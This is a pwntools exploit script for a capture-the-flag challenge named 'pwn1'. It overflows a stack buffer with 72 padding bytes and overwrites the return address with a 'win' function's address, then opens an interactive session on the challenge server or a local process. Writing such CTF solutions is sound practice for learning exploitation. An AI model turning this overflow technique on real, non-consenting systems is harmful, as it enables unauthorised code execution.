#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./pwn1"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("challs.n00bzunit3d.xyz", 35932)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

win = elf.symbols["win"]

payload = b'A' * 0x8 * 9
payload += p64(win)

p.recvuntil("?")
p.send(payload)

p.interactive()
